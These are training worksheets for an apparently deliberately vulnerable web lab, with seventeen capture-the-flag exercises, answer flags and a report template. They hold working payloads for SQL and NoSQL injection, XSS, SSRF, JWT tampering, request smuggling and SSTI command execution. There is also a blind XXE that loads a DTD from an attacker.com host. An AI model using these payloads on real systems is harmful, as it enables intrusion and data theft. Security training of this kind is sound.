# Sambhav Security Lab - Exercise Worksheets

This document provides structured exercises for learning and practicing web application security testing.

## Table of Contents

- [Beginner Exercises](#beginner-exercises)
- [Intermediate Exercises](#intermediate-exercises)
- [Advanced Exercises](#advanced-exercises)
- [Expert Exercises](#expert-exercises)

---

## Beginner Exercises

### Exercise 1: Authentication Bypass (SQL Injection)

**Objective:** Bypass login authentication using SQL injection

**Difficulty:** Easy  
**Time:** 15 minutes  
**Endpoint:** `POST /login`

**Tasks:**
1. Navigate to the login page at `/login`
2. Try logging in with username `admin'--` and any password
3. Understand why this works
4. Document the vulnerable code pattern
5. Capture the flag

**Questions:**
- What SQL query is being executed?
- How does `--` affect the query?
- What are other possible payloads?
- How would you fix this vulnerability?

**Flag:** `CTF{SQL1_1nj3ct10n_MAST3R}`

---

### Exercise 2: Broken Access Control

**Objective:** Access the admin panel without admin privileges

**Difficulty:** Easy  
**Time:** 10 minutes  
**Endpoint:** `GET /admin`

**Tasks:**
1. Log in as a regular user (alice:password123)
2. Navigate directly to `/admin` URL
3. Observe that you can access the admin panel
4. Enumerate all users in the system
5. Capture the flag

**Questions:**
- Why can regular users access admin routes?
- What is RBAC and why is it important?
- How would you implement proper access control?

**Flag:** `CTF{Br0k3n_Acc3ss_C0ntr0l}`

---

### Exercise 3: IDOR (Insecure Direct Object Reference)

**Objective:** Access other users' profiles

**Difficulty:** Easy  
**Time:** 15 minutes  
**Endpoint:** `GET /profile/:userId`

**Tasks:**
1. Log in as alice (user ID 2)
2. Access your profile at `/profile/2`
3. Change the URL to `/profile/1` (admin's profile)
4. Access other users' profiles by incrementing the ID
5. Capture the flag

**Questions:**
- What is IDOR?
- Why are sequential IDs dangerous?
- How would you prevent this attack?

**Flag:** `CTF{1D0R_Pr0bl3m}`

---

### Exercise 4: Information Disclosure

**Objective:** Find exposed debug endpoint

**Difficulty:** Easy  
**Time:** 10 minutes  
**Endpoint:** `GET /debug`

**Tasks:**
1. Navigate to `/debug` endpoint
2. Examine the exposed information
3. List all sensitive data revealed
4. Capture the flag

**Questions:**
- What information is exposed?
- Why are debug endpoints dangerous in production?
- How would you secure debug endpoints?

**Flag:** `CTF{D3bug_3ndp01nt_3xp0s3d}`

---

### Exercise 5: Cryptographic Failures

**Objective:** Decode leaked database backup

**Difficulty:** Easy  
**Time:** 10 minutes  
**Endpoint:** `GET /crypto-leak`

**Tasks:**
1. Access `/crypto-leak` endpoint
2. Copy the base64 encoded backup
3. Decode the backup to reveal credentials
4. Document all exposed secrets
5. Capture the flag

**Bash Command:**
```bash
# Decode base64
echo "BASE64_STRING" | base64 -d
```

**Flag:** `CTF{CrYpt0_F41lur3}`

---

## Intermediate Exercises

### Exercise 6: Stored XSS (Cross-Site Scripting)

**Objective:** Inject and execute JavaScript in comments

**Difficulty:** Medium  
**Time:** 20 minutes  
**Endpoint:** `POST /comment`

**Tasks:**
1. Log in to the application
2. Navigate to the dashboard
3. Post a comment with: `<script>alert('XSS')</script>`
4. Observe the script execution
5. Try other XSS payloads
6. Capture the flag

**Advanced Payloads:**
```html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
```

**Flag:** `CTF{XSS_C00k13_Th13f}`

---

### Exercise 7: Server-Side Request Forgery (SSRF)

**Objective:** Access internal resources through SSRF

**Difficulty:** Medium  
**Time:** 25 minutes  
**Endpoint:** `POST /fetch-url`

**Tasks:**
1. Log in to the application
2. Use `/fetch-url` to request `http://localhost:5000/debug`
3. Try accessing `file:///etc/passwd` (won't work in Docker)
4. Access internal endpoints
5. Capture the flag

**Payloads:**
```json
{"target": "http://localhost:5000/debug"}
{"target": "http://127.0.0.1:5000/admin"}
{"target": "file:///etc/hosts"}
```

**Flag:** `CTF{SSRF_L00pB4ck}`

---

### Exercise 8: JWT Token Manipulation

**Objective:** Modify JWT tokens to gain admin access

**Difficulty:** Medium  
**Time:** 30 minutes  
**Endpoints:** `POST /api/auth/jwt-login`, `GET /api/auth/jwt-verify`

**Tasks:**
1. Generate a JWT token via `/api/auth/jwt-login`
2. Decode the token at https://jwt.io
3. Change the algorithm to "none"
4. Set `admin: true` in the payload
5. Test the modified token
6. Capture the flag

**Tools:**
- jwt.io - Online JWT decoder
- jwt_tool - Python JWT manipulation tool

**Flag:** `CTF{JWT_T0k3n_M4n1pul4t10n}`

---

### Exercise 9: NoSQL Injection

**Objective:** Bypass authentication with NoSQL operators

**Difficulty:** Medium  
**Time:** 20 minutes  
**Endpoint:** `POST /api/nosql-login`

**Tasks:**
1. Attempt normal login with incorrect credentials
2. Use NoSQL operators to bypass authentication
3. Try different operator combinations
4. Capture the flag

**Payloads:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": "admin", "password": {"$regex": ".*"}}
```

**Flag:** `CTF{N0SQL_1nj3ct10n_Byp4ss}`

---

### Exercise 10: Mass Assignment

**Objective:** Escalate privileges through mass assignment

**Difficulty:** Medium  
**Time:** 15 minutes  
**Endpoint:** `POST /api/user-update`

**Tasks:**
1. Log in as a regular user
2. Use `/api/user-update` to update your profile
3. Add `"role": "admin"` to the request
4. Verify privilege escalation
5. Capture the flag

**Payload:**
```json
{
  "email": "attacker@evil.com",
  "role": "admin",
  "isAdmin": true
}
```

**Flag:** `CTF{M4ss_Ass1gnm3nt_R0l3_Esc}`

---

## Advanced Exercises

### Exercise 11: Server-Side Template Injection (SSTI)

**Objective:** Achieve code execution through template injection

**Difficulty:** Hard  
**Time:** 40 minutes  
**Endpoint:** `POST /api/render-template`

**Tasks:**
1. Test for template injection with `{{7*7}}`
2. Identify the template engine
3. Craft payload for code execution
4. Extract server information
5. Capture the flag

**Detection Payloads:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

**Exploitation (EJS):**
```
{{process.version}}
{{require('os').hostname()}}
{{global.process.mainModule.require('child_process').execSync('id').toString()}}
```

**Flag:** `CTF{SSTI_C0d3_Ex3cut10n}`

---

### Exercise 12: Race Condition

**Objective:** Exploit race conditions in withdrawal system

**Difficulty:** Hard  
**Time:** 45 minutes  
**Endpoint:** `POST /api/race-withdraw`

**Tasks:**
1. Check your initial balance
2. Send multiple concurrent withdrawal requests
3. Exploit the race condition window
4. Withdraw more than available balance
5. Capture the flag

**Bash Script:**
```bash
for i in {1..20}; do
  curl -X POST http://localhost:5000/api/race-withdraw \
    -H "Content-Type: application/json" \
    -H "Cookie: connect.sid=YOUR_SESSION" \
    -d '{"amount": 200}' &
done
wait
```

**Burp Suite:**
- Send request to Intruder
- Null payloads, 20+ threads
- Observe negative balance

**Flag:** `CTF{R4c3_C0nd1t10n_Expl01t}`

---

### Exercise 13: XML External Entity (XXE)

**Objective:** Read local files through XXE vulnerability

**Difficulty:** Hard  
**Time:** 35 minutes  
**Endpoint:** `POST /api/xml-parser`

**Tasks:**
1. Submit basic XML to test parsing
2. Craft XXE payload to read files
3. Attempt blind XXE if direct doesn't work
4. Extract sensitive information
5. Capture the flag

**Basic XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

**Blind XXE:**
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hosts">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
```

**Flag:** `CTF{XXE_F1l3_R34d_Succ3ss}`

---

### Exercise 14: GraphQL Introspection

**Objective:** Exploit GraphQL introspection and query depth

**Difficulty:** Hard  
**Time:** 30 minutes  
**Endpoint:** `POST /api/graphql`

**Tasks:**
1. Discover schema through introspection
2. Map all available types and fields
3. Craft deeply nested query for DoS
4. Capture both flags

**Introspection Query:**
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

**Depth Attack:**
```graphql
query {
  users {
    posts {
      comments {
        user {
          posts {
            comments {
              # ... continue nesting
            }
          }
        }
      }
    }
  }
}
```

**Flags:** `CTF{Gr4phQL_Intr0sp3ct10n}`, `CTF{Gr4phQL_D3pth_Att4ck}`

---

## Expert Exercises

### Exercise 15: HTTP Request Smuggling

**Objective:** Smuggle requests through conflicting headers

**Difficulty:** Expert  
**Time:** 60 minutes  
**Endpoint:** `POST /api/smuggle-request`

**Tasks:**
1. Understand CL.TE and TE.CL desync
2. Craft request with conflicting headers
3. Smuggle a second request
4. Bypass access controls
5. Capture the flag

**CL.TE Payload:**
```http
POST /api/smuggle-request HTTP/1.1
Host: localhost:5000
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost

```

**Flag:** `CTF{HTTP_R3qu3st_Smuggl1ng}`

---

### Exercise 16: Black Box Mystery Challenge

**Objective:** Complete reconnaissance and multi-vector exploitation

**Difficulty:** Expert  
**Time:** 90 minutes  
**Endpoint:** `/blackbox`

**Tasks:**
1. Enumerate all Black Box endpoints
2. Test product search for SQLi (`/blackbox/api/products`)
3. Test note vault for IDOR (`/blackbox/api/notes/:id`)
4. Test feedback for XSS (`/blackbox/api/feedback`)
5. Test diagnostics for SSRF (`/blackbox/api/diagnostics`)
6. Capture all 4 Black Box flags

**Reconnaissance:**
```bash
# Use browser DevTools to inspect API calls
# Check Network tab for hidden endpoints
# Test all discovered APIs for vulnerabilities
```

**Flags:**
- `CTF{Bl4ckB0x_Inv3nt0ry}` - SQL Injection
- `CTF{Bl4ckB0x_ID0R}` - IDOR
- `CTF{Bl4ckB0x_XSS}` - Stored XSS
- `CTF{Bl4ckB0x_Pr0xy}` - SSRF

---

### Exercise 17: Full Chain Exploitation

**Objective:** Chain multiple vulnerabilities for complete compromise

**Difficulty:** Expert  
**Time:** 120 minutes  

**Scenario:**
Starting as an unauthenticated user, achieve the following:
1. Gain authenticated access (SQLi)
2. Escalate to admin privileges (Mass Assignment or JWT)
3. Access all user data (IDOR)
4. Achieve code execution (SSTI)
5. Access internal resources (SSRF)

**Documentation Required:**
- Step-by-step exploitation path
- All flags captured
- Proof-of-concept code
- Mitigation recommendations

---

## Capture the Flag Scoreboard

Track your progress:

| Challenge | Difficulty | Points | Status |
|-----------|-----------|--------|--------|
| SQL Injection Login | Easy | 100 | ☐ |
| Broken Access Control | Easy | 100 | ☐ |
| IDOR | Easy | 100 | ☐ |
| Debug Endpoint | Easy | 100 | ☐ |
| Crypto Failure | Easy | 100 | ☐ |
| Stored XSS | Medium | 200 | ☐ |
| SSRF | Medium | 200 | ☐ |
| JWT Manipulation | Medium | 200 | ☐ |
| NoSQL Injection | Medium | 200 | ☐ |
| Mass Assignment | Medium | 200 | ☐ |
| SSTI | Hard | 300 | ☐ |
| Race Condition | Hard | 300 | ☐ |
| XXE | Hard | 300 | ☐ |
| GraphQL | Hard | 300 | ☐ |
| Request Smuggling | Expert | 500 | ☐ |
| Black Box (4 flags) | Expert | 400 | ☐ |

**Total Points: 3,700**

---

## Reporting Template

Use this template to document your findings:

```markdown
# Vulnerability Report

## Title
[Vulnerability Name]

## Severity
[ ] Critical  [ ] High  [ ] Medium  [ ] Low

## Affected Endpoint
`METHOD /endpoint`

## Description
[Brief description of the vulnerability]

## Steps to Reproduce
1. Step 1
2. Step 2
3. Step 3

## Proof of Concept
\`\`\`bash
curl command or code snippet
\`\`\`

## Impact
[Potential impact of exploitation]

## Mitigation
[Recommended fixes]

## References
- OWASP Link
- CVE if applicable

## Flag Captured
`CTF{FLAG_HERE}`
```

---

## Additional Resources

- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **PortSwigger Academy**: https://portswigger.net/web-security
- **HackerOne Reports**: https://hackerone.com/hacktivity
- **Bug Bounty Platforms**: HackerOne, Bugcrowd, Synack
- **CTF Platforms**: HackTheBox, TryHackMe, PentesterLab

---

**Remember:** Always practice ethical hacking responsibly and only on authorized systems!
